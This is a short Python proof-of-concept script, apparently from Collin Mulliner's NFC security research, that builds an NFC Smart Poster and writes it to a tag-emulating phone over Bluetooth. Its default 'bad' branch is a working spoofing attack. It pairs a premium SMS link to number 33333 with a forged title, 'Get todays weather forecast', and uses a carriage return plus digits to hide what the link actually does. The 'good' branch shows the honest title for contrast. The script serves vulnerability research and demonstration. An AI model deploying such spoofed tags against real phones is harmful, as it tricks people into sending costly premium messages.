#!/usr/bin/python

#
# Copyright: Collin Mulliner <collin@mulliner.org>
# Web: http://www.mulliner.org/nfc/
#
# License: GPLv2
#

import NDEFSmartPoster
import NDEFUri
import NDEFTextRecord
import NDEFMessage
import CollinsBtNfcAdapter
import os

if len(os.sys.argv) < 2:
	print "need to provide Bluetooth address of phone running BtNfcAdapter.jar"
	print "syntax: " + os.sys.argv[0] + " <BDADDR>"
else:
	sp = NDEFSmartPoster.NDEFSmartPoster()

	if len(os.sys.argv) == 2:
		# bad
		sp.setUri("sms:33333?body=tone1")
		sp.setTitle("Get todays weather forecast\r0800555123678")
	else:
		# good
		sp.setUri("sms:33333?body=tone1")
		sp.setTitle("Buy expensive ring tone")
	
	#print sp.getNDEFMessage().getHex()

	baddr = os.sys.argv[1]
	chan = 25
	na = CollinsBtNfcAdapter.CollinsBtNfcAdapter()
	na.quickWrite(sp.getNDEFMessage().getHex(), baddr, chan)
